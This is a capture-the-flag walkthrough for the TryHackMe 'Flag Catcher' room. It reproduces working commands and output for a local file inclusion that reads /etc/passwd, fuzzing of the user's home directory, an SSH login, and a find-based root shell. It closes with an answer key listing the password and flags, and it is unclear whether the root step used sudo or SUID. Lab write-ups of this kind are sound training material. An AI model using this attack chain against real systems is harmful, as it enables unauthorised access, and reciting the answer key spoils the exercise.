# TryHackMe : The Flag Catcher Walkthrough

A complete walkthrough for the **The Flag Catcher** room on TryHackMe.
* **Room URL:** https://tryhackme.com/room/theflagcatcher
* **Difficulty:** Easy

---

## 🛠️ Tools Used
* Nmap
* Gobuster
* Ffuf
* SSH
* Find

---

## Attack chain : ##

```
nmap → gobuster → LFI → ffuf → SSH → sudo -l → find → root flag
```
---

## 🔍 Phase 1: Enumeration & Reconnaissance

### Network Scanning
I started by scanning the target IP using `nmap` to find open ports and running services.

**Command:**

```

nmap -sV <TARGET_IP>
```
**Output:**
```

Starting Nmap 7.94 ( https://nmap.org )                                                        
Nmap scan report for 192.168.56.101                                                            
Host is up (0.00043s latency).                                                                 
                                                                                               
PORT   STATE SERVICE VERSION                                                                   
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)              
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                        
                                                                                               
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds                                    
```

### Web Directory Discovery
Next, I ran `gobuster` to find hidden directories/files on the web server.

**Command:**
```

gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x html,php,js,py
```

**Output:**
```

/cat.php              (Status: 200)
```

---

## 🚀 Phase 2: Vulnerability Analysis & Exploitation

### Local File Inclusion (LFI)
Testing the page parameter on `/cat.php` confirmed an arbitrary file reading vulnerability due to missing input sanitization.

* Enter this url in browser.

**URL:**
```

http://<TARGET_IP>/cat.php?file=/etc/passwd
```

**Output:**
```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:,,,:/home/ubuntu:/bin/bash
catcher:x:1001:1001:,,,:/home/catcher:/bin/bash
```

### Fuzzing with ffuf
To leverage the LFI into something actionable, I used `ffuf` to fuzz for sensitive configuration files or SSH keys hidden on the server.

**Command:**
```

ffuf -u http://<TARGET_IP>/cat.php?file=/home/catcher/FUZZ -w /home/kali/lfi_wordlist.txt -fs 0
```

**Output:**
```


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET_IP>/cat.php?file=/home/catcher/FUZZ
 :: Wordlist         : /home/kali/lfi_wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

note.txt                [Status: 200, Size: 27, Words: 2, Lines: 1, Duration: 56ms]
user.txt                [Status: 200, Size: 29, Words: 2, Lines: 1, Duration: 62ms]
:: Progress: [10/10] :: Job [1/1] :: 10 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

* Fuzzing revealed the path to the user's password(`/home/catcher/note.txt`).

---

## 😎 Phase 3: Initial Access and User Flag

### SSH Access
Next, I copied the catcher's password and logged into the target via `SSH`.

**Command:**
```

ssh catcher@<TARGET_IP>
```

**Output:**
```

catcher@catcher:~$
```

### User Flag
Once inside, I ran `ls` to show all files and directories.
* Found a file named `user.txt` that contain the user flag.
  
**Command:**
```

cat user.txt
```

**Output:**
```

THM{lfi_2_ssh_3asy}
```

---

## 👑 Phase 4: Privilege Escalation

### Local Enumeration
inside, I ran `sudo -l` to check the current user's privileges.
* Found that the user could run `/usr/bin/find` as root without a password.

### Root Exploitation
I abused this privilege by spawning a root shell using `Find`:

```

find . -exec /bin/sh -p \; -quit
```

### Root Flag
Next, I ran `cd /root` to go to /root directory.
* Found a file named `root.txt` that contain the root flag.
  
**Command:**
```

cat root.txt
```

**Output:**
```

THM{symlink_c4t_tr1ck}
```

---

## 🏁 Question and Answer
* **How many ports are open:** `2`
* **What version of Apache is running:** `2.4.66`
* **What service is running on port 22:** `ssh`
* **What is the hidden directory/file:** `cat.php`
* **which two user did you find in /passwd directory:** `ubuntu and catcher`
* **What is the user password:** `c4tch3r`
* **Where can you login with the details obtained:** `ssh`
* **What's the user flag:** `THM{lfi_2_ssh_3asy}`
* **Search for files with SUID permission, which file is weird:** `/usr/bin/find`
* **what command did you use to escalate your privileges:** `find . -exec /bin/sh -p \; -quit`
* **What's the root flag:** `THM{symlink_c4t_tr1ck}`

### Note:
1. Visit [GTFOBins](https://gtfobins.org/) to find workarounds for restricted shells and techniques to escalate privileges..
